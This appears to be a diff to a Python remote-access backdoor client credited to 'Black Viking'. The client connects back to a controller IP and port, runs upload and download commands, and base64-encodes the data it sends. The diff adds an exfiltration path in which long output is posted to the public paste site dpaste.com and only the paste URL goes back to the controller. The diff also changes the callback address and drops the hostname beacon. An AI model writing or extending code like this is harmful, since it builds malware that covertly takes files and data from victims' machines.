@@ -6,7 +6,8 @@
 __author__ = "Black Viking"
 __date__   = "13.04.2017"
 
-END_OF_FILE = "(((END_OF_FILE)))"
+END_OF_FILE   = "(((END_OF_FILE)))"
+END_OF_STRING = "(((END_OF_STRING)))"
 
 import ctypes
 import socket
@@ -16,6 +17,7 @@ import sys
 import base64
 import threading
 import urllib2
+import urllib
 import re
 import getpass
 import platform
@@ -29,7 +31,7 @@ if os.name == "nt":
 else:
     pass
 
-HOST = '127.0.0.1'
+HOST = '192.168.1.55'
 PORT = 8000
 
 def crypt(TEXT, encode=True):
@@ -39,8 +41,19 @@ def crypt(TEXT, encode=True):
         return base64.b64decode(TEXT)
 
 def send(data):
-    s.sendall(crypt(os.getcwd()))
-    s.sendall(crypt(data))
+    #s.sendall(crypt(data))
+	data = crypt(data)
+	
+	if len(data) > 1095:
+		s.sendall(crypt("(((FROM DPASTE)))"))
+		data = urllib.urlencode({"content": data})
+		req  = urllib2.Request(url="http://dpaste.com", data=data)
+		url  = urllib2.urlopen(req).url+".txt"
+		
+		s.sendall(crypt(url))
+	else:
+		s.sendall(data)
+	
 
 def download(command):
     fileName = command[len("upload "):]
@@ -71,7 +84,7 @@ def upload(command):
         fileName = str(command[len("download "):])
 
     try:
-        s.send(str(int(int(os.path.getsize(fileName)) / 1024)))
+        #s.send(str(int(int(os.path.getsize(fileName)) / 1024)))
 
         f = open(fileName, 'rb')
         l = f.read(1024)
@@ -208,7 +221,6 @@ def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.connect((HOST, PORT))
-        send(socket.gethostname())
     except:
         connect()
 
